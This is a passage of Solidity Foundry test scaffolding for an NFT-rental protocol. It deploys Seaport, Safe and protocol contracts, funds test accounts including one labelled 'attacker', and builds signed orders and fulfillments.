            // create a conduit key (first 20 bytes must be conduit creator)
            conduitKey = bytes32(uint256(uint160(conduitOwner.addr))) << 96;

            // create a new conduit
            vm.prank(conduitOwner.addr);
            address conduitAddress = conduitController.createConduit(
                conduitKey,
                conduitOwner.addr
            );

            // set the conduit address
            conduit = ConduitInterface(conduitAddress);

            // open a channel for seaport on the conduit
            vm.prank(conduitOwner.addr);
            conduitController.updateChannel(address(conduit), address(seaport), true);

            // label the contracts
            vm.label(address(seaport), "Seaport");
            vm.label(address(conduitController), "ConduitController");
            vm.label(address(conduit), "Conduit");
        }
    }

    // Deploys the Create2Deployer contract
    contract External_Create2Deployer is Test {
        Create2Deployer public create2Deployer;

        function setUp() public virtual {
            // Deploy the create2 deployer contract
            create2Deployer = new Create2Deployer();

            // label the contract
            vm.label(address(create2Deployer), "Create2Deployer");
        }
    }

    // Deploys all Gnosis Safe protocol contracts
    contract External_Safe is Test {
        SafeL2 public safeSingleton;
        SafeProxyFactory public safeProxyFactory;

        CompatibilityFallbackHandler public fallbackHandler;

        function setUp() public virtual {
            // Deploy safe singleton contract
            safeSingleton = new SafeL2();

            // Deploy safe proxy factory
            safeProxyFactory = new SafeProxyFactory();

            // Deploy the compatibility token handler
            fallbackHandler = new CompatibilityFallbackHandler();

            // Label the contracts
            vm.label(address(safeSingleton), "SafeSingleton");
            vm.label(address(safeProxyFactory), "SafeProxyFactory");
            vm.label(address(fallbackHandler), "TokenCallbackHandler");
        }
    }

    contract BaseExternal is External_Create2Deployer, External_Seaport, External_Safe {
        // This is an explicit entrypoint for all external contracts that the V3 protocol depends on.
        //
        // It contains logic for:
        // - setup of the Create2Deployer contract
        // - setup of all Seaport protocol contracts
        // - setup of all Gnosis Safe protocol contracts
        //
        // The inheritance chain is as follows:
        // External_Create2Deployer + External_Seaport + External_Safe
        // --> BaseExternal

        function setUp()
            public
            virtual
            override(External_Create2Deployer, External_Seaport, External_Safe)
        {
            // set up dependencies
            External_Create2Deployer.setUp();
            External_Seaport.setUp();
            External_Safe.setUp();
        }
    }

    // Deploys all V3 protocol contracts
    contract Protocol is BaseExternal {
        // Kernel
        Kernel public kernel;

        // Modules
        Storage public STORE;
        PaymentEscrow public ESCRW;

        // Module implementation addresses
        Storage public storageImplementation;
        PaymentEscrow public paymentEscrowImplementation;

        // Policies
        Create public create;
        Stop public stop;
        Factory public factory;
        Admin public admin;
        Guard public guard;

        // Protocol accounts
        Vm.Wallet public rentalSigner;
        Vm.Wallet public deployer;

        // protocol constants
        bytes12 public protocolVersion;
        bytes32 public salt;

        function _deployKernel() internal {
            // abi encode the kernel bytecode and constructor arguments
            bytes memory kernelInitCode = abi.encodePacked(
                type(Kernel).creationCode,
                abi.encode(deployer.addr, deployer.addr)
            );

            // Deploy kernel contract
            vm.prank(deployer.addr);
            kernel = Kernel(create2Deployer.deploy(salt, kernelInitCode));

            // label the contract
            vm.label(address(kernel), "kernel");
        }

        function _deployStorageModule() internal {
            // abi encode the storage bytecode and constructor arguments
            // for the implementation contract
            bytes memory storageImplementationInitCode = abi.encodePacked(
                type(Storage).creationCode,
                abi.encode(address(0))
            );

            // Deploy storage implementation contract
            vm.prank(deployer.addr);
            storageImplementation = Storage(
                create2Deployer.deploy(salt, storageImplementationInitCode)
            );

            // abi encode the storage bytecode and initialization arguments
            // for the proxy contract
            bytes memory storageProxyInitCode = abi.encodePacked(
                type(Proxy).creationCode,
                abi.encode(
                    address(storageImplementation),
                    abi.encodeWithSelector(
                        Storage.MODULE_PROXY_INSTANTIATION.selector,
                        address(kernel)
                    )
                )
            );

            // Deploy storage proxy contract
            vm.prank(deployer.addr);
            STORE = Storage(create2Deployer.deploy(salt, storageProxyInitCode));

            // label the contracts
            vm.label(address(STORE), "STORE");
            vm.label(address(storageImplementation), "STORE_IMPLEMENTATION");
        }

        function _deployPaymentEscrowModule() internal {
            // abi encode the payment escrow bytecode and constructor arguments
            // for the implementation contract
            bytes memory paymentEscrowImplementationInitCode = abi.encodePacked(
                type(PaymentEscrow).creationCode,
                abi.encode(address(0))
            );

            // Deploy payment escrow implementation contract
            vm.prank(deployer.addr);
            paymentEscrowImplementation = PaymentEscrow(
                create2Deployer.deploy(salt, paymentEscrowImplementationInitCode)
            );

            // abi encode the payment escrow bytecode and initialization arguments
            // for the proxy contract
            bytes memory paymentEscrowProxyInitCode = abi.encodePacked(
                type(Proxy).creationCode,
                abi.encode(
                    address(paymentEscrowImplementation),
                    abi.encodeWithSelector(
                        PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,
                        address(kernel)
                    )
                )
            );

            // Deploy payment escrow contract
            vm.prank(deployer.addr);
            ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));

            // label the contracts
            vm.label(address(ESCRW), "ESCRW");
            vm.label(address(paymentEscrowImplementation), "ESCRW_IMPLEMENTATION");
        }

        function _deployCreatePolicy() internal {
            // abi encode the create policy bytecode and constructor arguments
            bytes memory createInitCode = abi.encodePacked(
                type(Create).creationCode,
                abi.encode(address(kernel))
            );

            // Deploy create rental policy contract
            vm.prank(deployer.addr);
            create = Create(create2Deployer.deploy(salt, createInitCode));

            // label the contract
            vm.label(address(create), "CreatePolicy");
        }

        function _deployStopPolicy() internal {
            // abi encode the stop policy bytecode and constructor arguments
            bytes memory stopInitCode = abi.encodePacked(
                type(Stop).creationCode,
                abi.encode(address(kernel))
            );

            // Deploy stop rental policy contract
            vm.prank(deployer.addr);
            stop = Stop(create2Deployer.deploy(salt, stopInitCode));

            // label the contract
            vm.label(address(stop), "StopPolicy");
        }

        function _deployAdminPolicy() internal {
            // abi encode the admin policy bytecode and constructor arguments
            bytes memory adminInitCode = abi.encodePacked(
                type(Admin).creationCode,
                abi.encode(address(kernel))
            );

            // Deploy admin policy contract
            vm.prank(deployer.addr);
            admin = Admin(create2Deployer.deploy(salt, adminInitCode));

            // label the contract
            vm.label(address(admin), "AdminPolicy");
        }

        function _deployGuardPolicy() internal {
            // abi encode the guard policy bytecode and constructor arguments
            bytes memory guardInitCode = abi.encodePacked(
                type(Guard).creationCode,
                abi.encode(address(kernel))
            );

            // Deploy guard policy contract
            vm.prank(deployer.addr);
            guard = Guard(create2Deployer.deploy(salt, guardInitCode));

            // label the contract
            vm.label(address(guard), "GuardPolicy");
        }

        function _deployFactoryPolicy() internal {
            // abi encode the factory policy bytecode and constructor arguments
            bytes memory factoryInitCode = abi.encodePacked(
                type(Factory).creationCode,
                abi.encode(
                    address(kernel),
                    address(stop),
                    address(guard),
                    address(fallbackHandler),
                    address(safeProxyFactory),
                    address(safeSingleton)
                )
            );

            // Deploy factory policy contract
            vm.prank(deployer.addr);
            factory = Factory(create2Deployer.deploy(salt, factoryInitCode));

            // label the contract
            vm.label(address(factory), "FactoryPolicy");
        }

        function _setupKernel() internal {
            // Start impersonating the deployer
            vm.startPrank(deployer.addr);

            // Install modules
            kernel.executeAction(Actions.InstallModule, address(STORE));
            kernel.executeAction(Actions.InstallModule, address(ESCRW));

            // Approve policies
            kernel.executeAction(Actions.ActivatePolicy, address(create));
            kernel.executeAction(Actions.ActivatePolicy, address(stop));
            kernel.executeAction(Actions.ActivatePolicy, address(factory));
            kernel.executeAction(Actions.ActivatePolicy, address(guard));
            kernel.executeAction(Actions.ActivatePolicy, address(admin));

            // Grant `seaport` role to seaport protocol
            kernel.grantRole(toRole("SEAPORT"), address(seaport));

            // Grant `signer` role to the protocol signer to sign off on create payloads
            kernel.grantRole(toRole("CREATE_SIGNER"), rentalSigner.addr);

            // Grant 'admin_admin` role to the address which can conduct admin operations on the protocol
            kernel.grantRole(toRole("ADMIN_ADMIN"), deployer.addr);

            // Grant 'guard_admin` role to the address which can toggle hooks
            kernel.grantRole(toRole("GUARD_ADMIN"), deployer.addr);

            // Grant `stop_admin` role to the address which can skim funds from the payment escrow
            kernel.grantRole(toRole("STOP_ADMIN"), deployer.addr);

            // Stop impersonating the deployer
            vm.stopPrank();
        }

        function setUp() public virtual override {
            // setup dependencies
            super.setUp();

            // create the rental signer address and private key
            rentalSigner = vm.createWallet("rentalSigner");

            // create the deployer address and private key
            deployer = vm.createWallet("deployer");

            // contract salts (using 0x000000000000000000000100 to represent a version 1.0.0 of each contract)
            protocolVersion = 0x000000000000000000000100;
            salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);

            // deploy kernel
            _deployKernel();

            // Deploy payment escrow
            _deployPaymentEscrowModule();

            // Deploy rental storage
            _deployStorageModule();

            // deploy create policy
            _deployCreatePolicy();

            // deploy stop policy
            _deployStopPolicy();

            // deploy admin policy
            _deployAdminPolicy();

            // Deploy guard policy
            _deployGuardPolicy();

            // deploy rental factory
            _deployFactoryPolicy();

            // intialize the kernel
            _setupKernel();
        }
    }


    // Creates test accounts to interact with the V3 protocol
    // Borrowed from test/fixtures/protocol/AccountCreator
    contract AccountCreator is Protocol {
        // Protocol accounts for testing
        ProtocolAccount public alice;
        ProtocolAccount public bob;
        ProtocolAccount public carol;
        ProtocolAccount public dan;
        ProtocolAccount public eve;
        ProtocolAccount public attacker;

        // Mock tokens for testing
        MockERC20[] public erc20s;
        MockERC721[] public erc721s;
        MockERC1155[] public erc1155s;

        function setUp() public virtual override {
            super.setUp();

            // deploy 3 erc20 tokens, 3 erc721 tokens, and 3 erc1155 tokens
            _deployTokens(3);

            // instantiate all wallets and deploy rental safes for each
            alice = _fundWalletAndDeployRentalSafe("alice");
            bob = _fundWalletAndDeployRentalSafe("bob");
            carol = _fundWalletAndDeployRentalSafe("carol");
            dan = _fundWalletAndDeployRentalSafe("dan");
            eve = _fundWalletAndDeployRentalSafe("eve");
            attacker = _fundWalletAndDeployRentalSafe("attacker");



        }

        function _deployTokens(uint256 numTokens) internal {
            for (uint256 i; i < numTokens; i++) {
                _deployErc20Token();
                _deployErc721Token();
                _deployErc1155Token();
            }
        }

        function _deployErc20Token() internal returns (uint256 i) {
            // save the token's index
            i = erc20s.length;

            // deploy the mock token
            MockERC20 token = new MockERC20();

            // push the token to the array of mocks
            erc20s.push(token);

            // set the token label with the index
            vm.label(address(token), string.concat("MERC20_", LibString.toString(i)));
        }

        function _deployErc721Token() internal returns (uint256 i) {
            // save the token's index
            i = erc721s.length;

            // deploy the mock token
            MockERC721 token = new MockERC721();

            // push the token to the array of mocks
            erc721s.push(token);

            // set the token label with the index
            vm.label(address(token), string.concat("MERC721_", LibString.toString(i)));
        }

        function _deployErc1155Token() internal returns (uint256 i) {
            // save the token's index
            i = erc1155s.length;

            // deploy the mock token
            MockERC1155 token = new MockERC1155();

            // push the token to the array of mocks
            erc1155s.push(token);

            // set the token label with the index
            vm.label(address(token), string.concat("MERC1155_", LibString.toString(i)));
        }

        function _deployRentalSafe(
            address owner,
            string memory name
        ) internal returns (address safe) {
            // Deploy a 1/1 rental safe
            address[] memory owners = new address[](1);
            owners[0] = owner;
            safe = factory.deployRentalSafe(owners, 1);



        }

        function _fundWalletAndDeployRentalSafe(
            string memory name
        ) internal returns (ProtocolAccount memory account) {
            // create a wallet with a address, public key, and private key
            Vm.Wallet memory wallet = vm.createWallet(name);

            // deploy a rental safe for the address
            address rentalSafe = _deployRentalSafe(wallet.addr, name);

            // fund the wallet with ether, all erc20s, and approve the conduit for erc20s, erc721s, erc1155s
            _allocateTokensAndApprovals(wallet.addr, 10000);

            // create an account
            account = ProtocolAccount({
                addr: wallet.addr,
                safe: SafeL2(payable(rentalSafe)),
                publicKeyX: wallet.publicKeyX,
                publicKeyY: wallet.publicKeyY,
                privateKey: wallet.privateKey
            });

        }

        function _allocateTokensAndApprovals(address to, uint128 amount) internal {
            // deal ether to the recipient
            vm.deal(to, amount);

            // mint all erc20 tokens to the recipient
            for (uint256 i = 0; i < erc20s.length; ++i) {
                erc20s[i].mint(to, amount);
            }

            // set token approvals
            _setApprovals(to);
        }

        function _setApprovals(address owner) internal {
            // impersonate the owner address
            vm.startPrank(owner);

            // set all approvals for erc20 tokens
            for (uint256 i = 0; i < erc20s.length; ++i) {
                erc20s[i].approve(address(conduit), type(uint256).max);
            }

            // set all approvals for erc721 tokens
            for (uint256 i = 0; i < erc721s.length; ++i) {
                erc721s[i].setApprovalForAll(address(conduit), true);
            }

            // set all approvals for erc1155 tokens
            for (uint256 i = 0; i < erc1155s.length; ++i) {
                erc1155s[i].setApprovalForAll(address(conduit), true);
            }

            // stop impersonating
            vm.stopPrank();
        }
    }


    // Sets up logic in the test engine related to order creation
    // Borrowed from test/fixtures/engine/OrderCreator
    contract OrderCreator is AccountCreator {
        using OfferItemLib for OfferItem;
        using ConsiderationItemLib for ConsiderationItem;
        using OrderComponentsLib for OrderComponents;
        using OrderLib for Order;
        using ECDSA for bytes32;

        // defines a config for a standard order component
        string constant STANDARD_ORDER_COMPONENTS = "standard_order_components";

        struct OrderToCreate {
            ProtocolAccount offerer;
            OfferItem[] offerItems;
            ConsiderationItem[] considerationItems;
            OrderMetadata metadata;
        }

        // keeps track of tokens used during a test
        uint256[] usedOfferERC721s;
        uint256[] usedOfferERC1155s;

        uint256[] usedConsiderationERC721s;
        uint256[] usedConsiderationERC1155s;

        // components of an order
        OrderToCreate orderToCreate;

        function setUp() public virtual override {
            super.setUp();

            // Define a standard OrderComponents struct which is ready for
            // use with the Create Policy and the protocol conduit contract
            OrderComponentsLib
                .empty()
                .withOrderType(SeaportOrderType.FULL_RESTRICTED)
                .withZone(address(create))
                .withStartTime(block.timestamp)
                .withEndTime(block.timestamp + 100)
                .withSalt(123456789)
                .withConduitKey(conduitKey)
                .saveDefault(STANDARD_ORDER_COMPONENTS);

            // for each test token, create a storage slot
            for (uint256 i = 0; i < erc721s.length; i++) {
                usedOfferERC721s.push();
                usedConsiderationERC721s.push();

                usedOfferERC1155s.push();
                usedConsiderationERC1155s.push();
            }
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                                Order Creation                               //
        /////////////////////////////////////////////////////////////////////////////////

        // creates an order based on the provided context. The defaults on this order
        // are good for most test cases.
        function createOrder(
            ProtocolAccount memory offerer,
            OrderType orderType,
            uint256 erc721Offers,
            uint256 erc1155Offers,
            uint256 erc20Offers,
            uint256 erc721Considerations,
            uint256 erc1155Considerations,
            uint256 erc20Considerations
        ) internal {
            // require that the number of offer items or consideration items
            // dont exceed the number of test tokens
            require(
                erc721Offers <= erc721s.length &&
                    erc721Offers <= erc1155s.length &&
                    erc20Offers <= erc20s.length,
                "TEST: too many offer items defined"
            );
            require(
                erc721Considerations <= erc721s.length &&
                    erc1155Considerations <= erc1155s.length &&
                    erc20Considerations <= erc20s.length,
                "TEST: too many consideration items defined"
            );

            // create the offerer
            _createOfferer(offerer);

            // add the offer items
            _createOfferItems(erc721Offers, erc1155Offers, erc20Offers);

            // create the consideration items
            _createConsiderationItems(
                erc721Considerations,
                erc1155Considerations,
                erc20Considerations
            );

            // Create order metadata
            _createOrderMetadata(orderType);
        }

        // Creates an offerer on the order to create
        function _createOfferer(ProtocolAccount memory offerer) private {
            orderToCreate.offerer = offerer;
        }

        // Creates offer items which are good for most tests
        function _createOfferItems(
            uint256 erc721Offers,
            uint256 erc1155Offers,
            uint256 erc20Offers
        ) private {
            // generate the ERC721 offer items
            for (uint256 i = 0; i < erc721Offers; ++i) {
                // create the offer item
                orderToCreate.offerItems.push(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC721)
                        .withToken(address(erc721s[i]))
                        .withIdentifierOrCriteria(usedOfferERC721s[i])
                        .withStartAmount(1)
                        .withEndAmount(1)
                );

                // mint an erc721 to the offerer
                erc721s[i].mint(orderToCreate.offerer.addr);

                // update the used token so it cannot be used again in the same test
                usedOfferERC721s[i]++;
            }

            // generate the ERC1155 offer items
            for (uint256 i = 0; i < erc1155Offers; ++i) {
                // create the offer item
                orderToCreate.offerItems.push(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC1155)
                        .withToken(address(erc1155s[i]))
                        .withIdentifierOrCriteria(usedOfferERC1155s[i])
                        .withStartAmount(100)
                        .withEndAmount(100)
                );

                // mint an erc1155 to the offerer
                erc1155s[i].mint(orderToCreate.offerer.addr, 100);

                // update the used token so it cannot be used again in the same test
                usedOfferERC1155s[i]++;
            }

            // generate the ERC20 offer items
            for (uint256 i = 0; i < erc20Offers; ++i) {
                // create the offer item
                orderToCreate.offerItems.push(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC20)
                        .withToken(address(erc20s[i]))
                        .withStartAmount(100)
                        .withEndAmount(100)
                );
            }
        }

        // Creates consideration items that are good for most tests
        function _createConsiderationItems(
            uint256 erc721Considerations,
            uint256 erc1155Considerations,
            uint256 erc20Considerations
        ) private {
            // generate the ERC721 consideration items
            for (uint256 i = 0; i < erc721Considerations; ++i) {
                // create the consideration item, and set the recipient as the offerer's
                // rental safe address
                orderToCreate.considerationItems.push(
                    ConsiderationItemLib
                        .empty()
                        .withRecipient(address(orderToCreate.offerer.safe))
                        .withItemType(ItemType.ERC721)
                        .withToken(address(erc721s[i]))
                        .withIdentifierOrCriteria(usedConsiderationERC721s[i])
                        .withStartAmount(1)
                        .withEndAmount(1)
                );

                // update the used token so it cannot be used again in the same test
                usedConsiderationERC721s[i]++;
            }

            // generate the ERC1155 consideration items
            for (uint256 i = 0; i < erc1155Considerations; ++i) {
                // create the consideration item, and set the recipient as the offerer's
                // rental safe address
                orderToCreate.considerationItems.push(
                    ConsiderationItemLib
                        .empty()
                        .withRecipient(address(orderToCreate.offerer.safe))
                        .withItemType(ItemType.ERC1155)
                        .withToken(address(erc1155s[i]))
                        .withIdentifierOrCriteria(usedConsiderationERC1155s[i])
                        .withStartAmount(100)
                        .withEndAmount(100)
                );

                // update the used token so it cannot be used again in the same test
                usedConsiderationERC1155s[i]++;
            }

            // generate the ERC20 consideration items
            for (uint256 i = 0; i < erc20Considerations; ++i) {
                // create the offer item
                orderToCreate.considerationItems.push(
                    ConsiderationItemLib
                        .empty()
                        .withRecipient(address(ESCRW))
                        .withItemType(ItemType.ERC20)
                        .withToken(address(erc20s[i]))
                        .withStartAmount(100)
                        .withEndAmount(100)
                );
            }
        }

        // Creates a order metadata that is good for most tests
        function _createOrderMetadata(OrderType orderType) private {
            // Create order metadata
            orderToCreate.metadata.orderType = orderType;
            orderToCreate.metadata.rentDuration = 500;
            orderToCreate.metadata.emittedExtraData = new bytes(0);
        }

        // creates a signed seaport order ready to be fulfilled by a renter
        function _createSignedOrder(
            ProtocolAccount memory _offerer,
            OfferItem[] memory _offerItems,
            ConsiderationItem[] memory _considerationItems,
            OrderMetadata memory _metadata
        ) private view returns (Order memory order, bytes32 orderHash) {
            // Build the order components
            OrderComponents memory orderComponents = OrderComponentsLib
                .fromDefault(STANDARD_ORDER_COMPONENTS)
                .withOfferer(_offerer.addr)
                .withOffer(_offerItems)
                .withConsideration(_considerationItems)
                .withZoneHash(create.getOrderMetadataHash(_metadata))
                .withCounter(seaport.getCounter(_offerer.addr));

            // generate the order hash
            orderHash = seaport.getOrderHash(orderComponents);

            // generate the signature for the order components
            bytes memory signature = _signSeaportOrder(_offerer.privateKey, orderHash);

            // create the order, but dont provide a signature if its a PAYEE order.
            // Since PAYEE orders are fulfilled by the offerer of the order, they
            // dont need a signature.
            if (_metadata.orderType == OrderType.PAYEE) {
                order = OrderLib.empty().withParameters(orderComponents.toOrderParameters());
            } else {
                order = OrderLib
                    .empty()
                    .withParameters(orderComponents.toOrderParameters())
                    .withSignature(signature);
            }
        }

        function _signSeaportOrder(
            uint256 signerPrivateKey,
            bytes32 orderHash
        ) private view returns (bytes memory signature) {
            // fetch domain separator from seaport
            (, bytes32 domainSeparator, ) = seaport.information();

            // sign the EIP-712 digest
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(
                signerPrivateKey,
                domainSeparator.toTypedDataHash(orderHash)
            );

            // encode the signature
            signature = abi.encodePacked(r, s, v);
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                               Order Amendments                              //
        /////////////////////////////////////////////////////////////////////////////////

        function resetOrderToCreate() internal {
            delete orderToCreate;
        }

        function withOfferer(ProtocolAccount memory _offerer) internal {
            orderToCreate.offerer = _offerer;
        }

        function resetOfferer() internal {
            delete orderToCreate.offerer;
        }

        function withReplacedOfferItems(OfferItem[] memory _offerItems) internal {
            // reset all current offer items
            resetOfferItems();

            // add the new offer items to storage
            for (uint256 i = 0; i < _offerItems.length; i++) {
                orderToCreate.offerItems.push(_offerItems[i]);
            }
        }

        function withOfferItem(OfferItem memory offerItem) internal {
            orderToCreate.offerItems.push(offerItem);
        }

        function resetOfferItems() internal {
            delete orderToCreate.offerItems;
        }

        function popOfferItem() internal {
            orderToCreate.offerItems.pop();
        }

        function withReplacedConsiderationItems(
            ConsiderationItem[] memory _considerationItems
        ) internal {
            // reset all current consideration items
            resetConsiderationItems();

            // add the new consideration items to storage
            for (uint256 i = 0; i < _considerationItems.length; i++) {
                orderToCreate.considerationItems.push(_considerationItems[i]);
            }
        }

        function withConsiderationItem(ConsiderationItem memory considerationItem) internal {
            orderToCreate.considerationItems.push(considerationItem);
        }

        function resetConsiderationItems() internal {
            delete orderToCreate.considerationItems;
        }

        function popConsiderationItem() internal {
            orderToCreate.considerationItems.pop();
        }

        function withHooks(Hook[] memory hooks) internal {
            // delete the current metatdata hooks
            delete orderToCreate.metadata.hooks;

            // add each metadata hook to storage
            for (uint256 i = 0; i < hooks.length; i++) {
                orderToCreate.metadata.hooks.push(hooks[i]);
            }
        }

        function withOrderMetadata(OrderMetadata memory _metadata) internal {
            // update the static metadata parameters
            orderToCreate.metadata.orderType = _metadata.orderType;
            orderToCreate.metadata.rentDuration = _metadata.rentDuration;
            orderToCreate.metadata.emittedExtraData = _metadata.emittedExtraData;

            // update the hooks
            withHooks(_metadata.hooks);
        }

        function resetOrderMetadata() internal {
            delete orderToCreate.metadata;
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                              Order Finalization                             //
        /////////////////////////////////////////////////////////////////////////////////

        function finalizeOrder()
            internal
            returns (Order memory, bytes32, OrderMetadata memory)
        {
            // create and sign the order
            (Order memory order, bytes32 orderHash) = _createSignedOrder(
                orderToCreate.offerer,
                orderToCreate.offerItems,
                orderToCreate.considerationItems,
                orderToCreate.metadata
            );

            // pull order metadata into memory
            OrderMetadata memory metadata = orderToCreate.metadata;

            // clear structs
            resetOrderToCreate();

            return (order, orderHash, metadata);
        }
    }


    // Sets up logic in the test engine related to order fulfillment
    // Borrowed from test/fixtures/engine/OrderFulfiller
    contract OrderFulfiller is OrderCreator {
        using ECDSA for bytes32;

        struct OrderToFulfill {
            bytes32 orderHash;
            RentPayload payload;
            AdvancedOrder advancedOrder;
        }

        // components of a fulfillment
        ProtocolAccount fulfiller;
        OrderToFulfill[] ordersToFulfill;
        Fulfillment[] seaportMatchOrderFulfillments;
        FulfillmentComponent[][] seaportOfferFulfillments;
        FulfillmentComponent[][] seaportConsiderationFulfillments;
        address seaportRecipient;

        /////////////////////////////////////////////////////////////////////////////////
        //                             Fulfillment Creation                            //
        /////////////////////////////////////////////////////////////////////////////////

        // creates an order fulfillment
        function createOrderFulfillment(
            ProtocolAccount memory _fulfiller,
            Order memory order,
            bytes32 orderHash,
            OrderMetadata memory metadata
        ) internal {
            // set the fulfiller account
            fulfiller = _fulfiller;

            // set the recipient of any offer items after an order is fulfilled. If the fulfillment is via
            // `matchAdvancedOrders`, then any unspent offer items will go to this address as well
            seaportRecipient = address(_fulfiller.safe);

            // get a pointer to a new order to fulfill
            OrderToFulfill storage orderToFulfill = ordersToFulfill.push();

            // create an order fulfillment
            OrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));

            // add the order hash and fulfiller
            orderToFulfill.orderHash = orderHash;

            // create rental zone payload data
            _createRentalPayload(
                orderToFulfill.payload,
                RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr)
            );

            // generate the signature for the payload
            bytes memory signature = _signProtocolOrder(
                rentalSigner.privateKey,
                create.getRentPayloadHash(orderToFulfill.payload)
            );

            // create an advanced order from the order. Pass the rental
            // payload as extra data
            _createAdvancedOrder(
                orderToFulfill.advancedOrder,
                AdvancedOrder(
                    order.parameters,
                    1,
                    1,
                    order.signature,
                    abi.encode(orderToFulfill.payload, signature)
                )
            );
        }

        function _createOrderFulfiller(
            ProtocolAccount storage storageFulfiller,
            ProtocolAccount memory _fulfiller
        ) private {
            storageFulfiller.addr = _fulfiller.addr;
            storageFulfiller.safe = _fulfiller.safe;
            storageFulfiller.publicKeyX = _fulfiller.publicKeyX;
            storageFulfiller.publicKeyY = _fulfiller.publicKeyY;
            storageFulfiller.privateKey = _fulfiller.privateKey;
        }

        function _createOrderFulfillment(
            OrderFulfillment storage storageFulfillment,
            OrderFulfillment memory fulfillment
        ) private {
            storageFulfillment.recipient = fulfillment.recipient;
        }

        function _createOrderMetadata(
            OrderMetadata storage storageMetadata,
            OrderMetadata memory metadata
        ) private {
            // Create order metadata in storage
            storageMetadata.orderType = metadata.orderType;
            storageMetadata.rentDuration = metadata.rentDuration;
            storageMetadata.emittedExtraData = metadata.emittedExtraData;

            // dynamically push the hooks from memory to storage
            for (uint256 i = 0; i < metadata.hooks.length; i++) {
                storageMetadata.hooks.push(metadata.hooks[i]);
            }
        }

        function _createRentalPayload(
            RentPayload storage storagePayload,
            RentPayload memory payload
        ) private {
            // set payload fulfillment on the order to fulfill
            _createOrderFulfillment(storagePayload.fulfillment, payload.fulfillment);

            // set payload metadata on the order to fulfill
            _createOrderMetadata(storagePayload.metadata, payload.metadata);

            // set payload expiration on the order to fulfill
            storagePayload.expiration = payload.expiration;

            // set payload intended fulfiller on the order to fulfill
            storagePayload.intendedFulfiller = payload.intendedFulfiller;
        }

        function _createAdvancedOrder(
            AdvancedOrder storage storageAdvancedOrder,
            AdvancedOrder memory advancedOrder
        ) private {
            // create the order parameters on the order to fulfill
            _createOrderParameters(storageAdvancedOrder.parameters, advancedOrder.parameters);

            // create the rest of the static parameters on the order to fulfill
            storageAdvancedOrder.numerator = advancedOrder.numerator;
            storageAdvancedOrder.denominator = advancedOrder.denominator;
            storageAdvancedOrder.signature = advancedOrder.signature;
            storageAdvancedOrder.extraData = advancedOrder.extraData;
        }

        function _createOrderParameters(
            OrderParameters storage storageOrderParameters,
            OrderParameters memory orderParameters
        ) private {
            // create the static order parameters for the order to fulfill
            storageOrderParameters.offerer = orderParameters.offerer;
            storageOrderParameters.zone = orderParameters.zone;
            storageOrderParameters.orderType = orderParameters.orderType;
            storageOrderParameters.startTime = orderParameters.startTime;
            storageOrderParameters.endTime = orderParameters.endTime;
            storageOrderParameters.zoneHash = orderParameters.zoneHash;
            storageOrderParameters.salt = orderParameters.salt;
            storageOrderParameters.conduitKey = orderParameters.conduitKey;
            storageOrderParameters.totalOriginalConsiderationItems = orderParameters
                .totalOriginalConsiderationItems;

            // create the dynamic order parameters for the order to fulfill
            for (uint256 i = 0; i < orderParameters.offer.length; i++) {
                storageOrderParameters.offer.push(orderParameters.offer[i]);
            }
            for (uint256 i = 0; i < orderParameters.consideration.length; i++) {
                storageOrderParameters.consideration.push(orderParameters.consideration[i]);
            }
        }

        function _createSeaportFulfillment(
            Fulfillment storage storageFulfillment,
            Fulfillment memory fulfillment
        ) private {
            // push the offer components to storage
            for (uint256 i = 0; i < fulfillment.offerComponents.length; i++) {
                storageFulfillment.offerComponents.push(fulfillment.offerComponents[i]);
            }

            // push the consideration components to storage
            for (uint256 i = 0; i < fulfillment.considerationComponents.length; i++) {
                storageFulfillment.considerationComponents.push(
                    fulfillment.considerationComponents[i]
                );
            }
        }

        function _seaportItemTypeToRentalItemType(
            SeaportItemType seaportItemType
        ) internal pure returns (RentalItemType) {
            if (seaportItemType == SeaportItemType.ERC20) {
                return RentalItemType.ERC20;
            } else if (seaportItemType == SeaportItemType.ERC721) {
                return RentalItemType.ERC721;
            } else if (seaportItemType == SeaportItemType.ERC1155) {
                return RentalItemType.ERC1155;
            } else {
                revert("seaport item type not supported");
            }
        }

        function _createRentalOrder(
            OrderToFulfill memory orderToFulfill
        ) internal view returns (RentalOrder memory rentalOrder) {
            // get the order parameters
            OrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;

            // get the payload
            RentPayload memory payload = orderToFulfill.payload;

            // get the metadata
            OrderMetadata memory metadata = payload.metadata;

            // construct a rental order
            rentalOrder = RentalOrder({
                seaportOrderHash: orderToFulfill.orderHash,
                items: new Item[](parameters.offer.length + parameters.consideration.length),
                hooks: metadata.hooks,
                orderType: metadata.orderType,
                lender: parameters.offerer,
                renter: payload.intendedFulfiller,
                rentalWallet: payload.fulfillment.recipient,
                startTimestamp: block.timestamp,
                endTimestamp: block.timestamp + metadata.rentDuration
            });

            // for each new offer item being rented, create a new item struct to add to the rental order
            for (uint256 i = 0; i < parameters.offer.length; i++) {
                // PAYEE orders cannot have offer items
                require(
                    metadata.orderType != OrderType.PAYEE,
                    "TEST: cannot have offer items in PAYEE order"
                );

                // get the offer item
                OfferItem memory offerItem = parameters.offer[i];

                // determine the item type
                RentalItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);

                // determine which entity the payment will settle to
                SettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20
                    ? SettleTo.RENTER
                    : SettleTo.LENDER;

                // create a new rental item
                rentalOrder.items[i] = Item({
                    itemType: itemType,
                    settleTo: settleTo,
                    token: offerItem.token,
                    amount: offerItem.startAmount,
                    identifier: offerItem.identifierOrCriteria
                });
            }

            // for each consideration item in return, create a new item struct to add to the rental order
            for (uint256 i = 0; i < parameters.consideration.length; i++) {
                // PAY orders cannot have consideration items
                require(
                    metadata.orderType != OrderType.PAY,
                    "TEST: cannot have consideration items in PAY order"
                );

                // get the offer item
                ConsiderationItem memory considerationItem = parameters.consideration[i];

                // determine the item type
